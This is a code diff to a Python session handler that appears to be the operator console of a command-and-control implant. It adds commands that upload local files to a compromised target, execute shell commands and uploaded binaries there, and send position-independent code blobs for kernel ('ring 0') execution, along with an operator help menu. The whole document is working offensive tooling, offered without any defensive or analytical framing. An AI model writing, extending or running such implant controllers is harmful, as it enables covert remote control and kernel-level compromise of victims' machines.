@@ -219,8 +219,59 @@ def handle_session(session):
                 break
             if not running[0]:
                 break
-            session.send((line + "\n").encode())
-            if line.strip() == "exit":
+
+            stripped = line.strip()
+
+            # Local commands that prepare data before sending
+            if stripped.startswith("!upload "):
+                # !upload <local_file> <remote_path>
+                parts = stripped[8:].split(None, 1)
+                if len(parts) != 2:
+                    print("[lp] usage: !upload <local_file> <remote_path>")
+                    continue
+                local_file, remote_path = parts
+                try:
+                    import base64
+                    data = open(local_file, "rb").read()
+                    b64 = base64.b64encode(data).decode()
+                    print(f"[lp] uploading {local_file} ({len(data)} bytes) → {remote_path}")
+                    session.send(f"!upload {remote_path} {b64}\n".encode())
+                except FileNotFoundError:
+                    print(f"[lp] file not found: {local_file}")
+                    continue
+                except Exception as e:
+                    print(f"[lp] upload error: {e}")
+                    continue
+
+            elif stripped.startswith("!kload "):
+                # !kload <local_file> — send PIC blob for kernel execution
+                local_file = stripped[7:].strip()
+                try:
+                    import base64
+                    data = open(local_file, "rb").read()
+                    b64 = base64.b64encode(data).decode()
+                    print(f"[lp] sending PIC blob {local_file} ({len(data)} bytes) for ring 0 exec")
+                    session.send(f"!kload {b64}\n".encode())
+                except FileNotFoundError:
+                    print(f"[lp] file not found: {local_file}")
+                    continue
+                except Exception as e:
+                    print(f"[lp] kload error: {e}")
+                    continue
+
+            elif stripped == "!help":
+                print("Operator commands:")
+                print("  <cmd>                      — execute shell command on target")
+                print("  !upload <local> <remote>   — upload file to target")
+                print("  !run <path> [args]         — run uploaded binary on target")
+                print("  !kload <local_blob>        — send PIC blob → ring 0 execution")
+                print("  exit                       — disconnect")
+                continue
+
+            else:
+                session.send((line + "\n").encode())
+
+            if stripped == "exit":
                 break
     except KeyboardInterrupt:
         pass
